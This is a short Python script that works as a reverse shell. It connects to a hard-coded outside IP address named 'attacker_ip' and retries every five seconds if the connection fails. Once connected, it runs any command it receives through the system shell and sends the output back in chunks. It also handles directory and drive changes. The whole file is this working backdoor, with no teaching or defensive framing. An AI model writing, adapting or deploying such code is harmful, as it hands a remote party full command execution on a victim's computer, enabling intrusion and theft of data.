import socket
import subprocess
import time
import os

attacker_ip = '84.229.211.141'
port = 87

while True:
    try:
        print("Trying to connect...")
        s = socket.socket()
        s.settimeout(3)
        s.connect((attacker_ip, port))
        s.settimeout(None)
        print("Connected to attacker.")

        
        
        while True:
            try:
                cwd = os.getcwd()
                s.send(cwd.encode())
                print(f"sent:\n{cwd.encode()}")

                command = s.recv(1024).decode()
                print(f"recv:\n{command}")
                if command.lower() == "exit":
                    print("[+] Exit command received. Closing connection.")
                    s.close()
                    break

                if command.lower().startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        output = f"Changed directory to {os.getcwd()}".encode()
                    except Exception as e:
                        output = str(e).encode()

                elif len(command.strip()) == 2 and command[1] == ':' and command[0].isalpha():
                    try:
                        os.chdir(command.strip() + "\\")
                        output = f"Changed drive to {os.getcwd()}".encode()
                    except Exception as e:
                        output = str(e).encode()

                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    except Exception as e:
                        output = str(e).encode()



                chunk_size = 1024
                for i in range(0, len(output), chunk_size):
                    s.send(output[i:i + chunk_size])
                    print(f"sent:\n{output[i:i + chunk_size]}")

                s.send(b"<EOF>\n")
                print(f"sent:\n{b"<EOF>\n"}")

            except Exception as e:
                print(f"[-] Error during command execution: {e}")
                break

    except Exception as e:
        print(f"Connection failed: {e}")
        try:
            s.close()
        except:
            pass
        time.sleep(5)  # Retry after a 5-second delay
